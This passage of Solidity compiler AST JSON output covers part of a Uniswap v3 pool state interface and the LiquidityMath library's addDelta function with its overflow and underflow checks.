													"id": 1692,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5390:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1695,
												"mutability": "mutable",
												"name": "tokensOwed0",
												"nameLocation": "5444:11:8",
												"nodeType": "VariableDeclaration",
												"scope": 1699,
												"src": "5436:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1694,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5436:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1697,
												"mutability": "mutable",
												"name": "tokensOwed1",
												"nameLocation": "5477:11:8",
												"nodeType": "VariableDeclaration",
												"scope": 1699,
												"src": "5469:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1696,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5469:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5298:200:8"
									},
									"scope": 1714,
									"src": "5220:279:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1700,
										"nodeType": "StructuredDocumentation",
										"src": "5505:749:8",
										"text": "@notice Returns data about a specific observation index\n @param index The element of the observations array to fetch\n @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n ago, rather than at a specific index in the array.\n @return blockTimestamp The timestamp of the observation,\n Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n Returns initialized whether the observation has been initialized and the values are safe to use"
									},
									"functionSelector": "252c09d7",
									"id": 1713,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observations",
									"nameLocation": "6268:12:8",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1703,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1702,
												"mutability": "mutable",
												"name": "index",
												"nameLocation": "6289:5:8",
												"nodeType": "VariableDeclaration",
												"scope": 1713,
												"src": "6281:13:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1701,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6281:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6280:15:8"
									},
									"returnParameters": {
										"id": 1712,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1705,
												"mutability": "mutable",
												"name": "blockTimestamp",
												"nameLocation": "6363:14:8",
												"nodeType": "VariableDeclaration",
												"scope": 1713,
												"src": "6356:21:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 1704,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "6356:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1707,
												"mutability": "mutable",
												"name": "tickCumulative",
												"nameLocation": "6397:14:8",
												"nodeType": "VariableDeclaration",
												"scope": 1713,
												"src": "6391:20:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 1706,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "6391:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1709,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128",
												"nameLocation": "6433:33:8",
												"nodeType": "VariableDeclaration",
												"scope": 1713,
												"src": "6425:41:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1708,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "6425:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1711,
												"mutability": "mutable",
												"name": "initialized",
												"nameLocation": "6485:11:8",
												"nodeType": "VariableDeclaration",
												"scope": 1713,
												"src": "6480:16:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1710,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "6480:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6342:164:8"
									},
									"scope": 1714,
									"src": "6259:248:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1715,
							"src": "240:6269:8",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "45:6465:8"
				},
				"id": 8
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
					"exportedSymbols": {
						"LiquidityMath": [
							1766
						]
					},
					"id": 1767,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1716,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:9"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "LiquidityMath",
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 1717,
								"nodeType": "StructuredDocumentation",
								"src": "71:38:9",
								"text": "@title Math library for liquidity"
							},
							"fullyImplemented": true,
							"id": 1766,
							"linearizedBaseContracts": [
								1766
							],
							"name": "LiquidityMath",
							"nameLocation": "117:13:9",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 1764,
										"nodeType": "Block",
										"src": "456:163:9",
										"statements": [
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													},
													"id": 1729,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 1727,
														"name": "y",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1722,
														"src": "470:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_int128",
															"typeString": "int128"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"hexValue": "30",
														"id": 1728,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "474:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "470:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 1762,
													"nodeType": "Block",
													"src": "548:65:9",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 1758,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"components": [
																				{
																					"id": 1755,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"id": 1748,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1725,
																						"src": "571:1:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 1754,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 1749,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1720,
																							"src": "575:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"arguments": [
																								{
																									"id": 1752,
																									"name": "y",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 1722,
																									"src": "587:1:9",
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 1751,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "579:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 1750,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "579:7:9",
																									"typeDescriptions": {}
																								}
																							},
																							"id": 1753,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"nameLocations": [],
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "579:10:9",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "575:14:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "571:18:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 1756,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "570:20:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": ">=",
																		"rightExpression": {
																			"id": 1757,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1720,
																			"src": "594:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "570:25:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"hexValue": "4c41",
																		"id": 1759,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "597:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		},
																		"value": "LA"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		}
																	],
																	"id": 1747,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967278,
																		4294967278
																	],
																	"referencedDeclaration": 4294967278,
																	"src": "562:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 1760,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "562:40:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1761,
															"nodeType": "ExpressionStatement",
															"src": "562:40:9"
														}
													]
												},
												"id": 1763,
												"nodeType": "IfStatement",
												"src": "466:147:9",
												"trueBody": {
													"id": 1746,
													"nodeType": "Block",
													"src": "477:65:9",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 1742,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"components": [
																				{
																					"id": 1739,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"id": 1731,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1725,
																						"src": "500:1:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 1738,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 1732,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1720,
																							"src": "504:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "-",
																						"rightExpression": {
																							"arguments": [
																								{
																									"id": 1736,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"nodeType": "UnaryOperation",
																									"operator": "-",
																									"prefix": true,
																									"src": "516:2:9",
																									"subExpression": {
																										"id": 1735,
																										"name": "y",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 1722,
																										"src": "517:1:9",
																										"typeDescriptions": {
																											"typeIdentifier": "t_int128",
																											"typeString": "int128"
																										}
																									},
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 1734,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "508:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 1733,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "508:7:9",
																									"typeDescriptions": {}
																								}
																							},
																							"id": 1737,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"nameLocations": [],
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "508:11:9",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "504:15:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "500:19:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 1740,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "499:21:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"id": 1741,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1720,
																			"src": "523:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "499:25:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"hexValue": "4c53",
																		"id": 1743,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "526:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		},
																		"value": "LS"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		}
																	],
																	"id": 1730,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967278,
																		4294967278
																	],
																	"referencedDeclaration": 4294967278,
																	"src": "491:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 1744,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "491:40:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1745,
															"nodeType": "ExpressionStatement",
															"src": "491:40:9"
														}
													]
												}
											}
										]
									},
									"documentation": {
										"id": 1718,
										"nodeType": "StructuredDocumentation",
										"src": "137:241:9",
										"text": "@notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n @param x The liquidity before change\n @param y The delta by which liquidity should be changed\n @return z The liquidity delta"
									},
									"id": 1765,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "addDelta",
									"nameLocation": "392:8:9",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1723,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1720,
												"mutability": "mutable",
												"name": "x",
												"nameLocation": "409:1:9",
												"nodeType": "VariableDeclaration",
												"scope": 1765,
												"src": "401:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1719,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "401:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1722,
												"mutability": "mutable",
												"name": "y",
												"nameLocation": "419:1:9",
												"nodeType": "VariableDeclaration",
												"scope": 1765,
												"src": "412:8:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 1721,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "412:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "400:21:9"
									},
									"returnParameters": {
										"id": 1726,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1725,
												"mutability": "mutable",
												"name": "z",
												"nameLocation": "453:1:9",
												"nodeType": "VariableDeclaration",
												"scope": 1765,
												"src": "445:9:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1724,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "445:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "444:11:9"
									},
									"scope": 1766,
									"src": "383:236:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 1767,
							"src": "109:512:9",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "45:577:9"
				},
				"id": 9
			}
		}
	}
}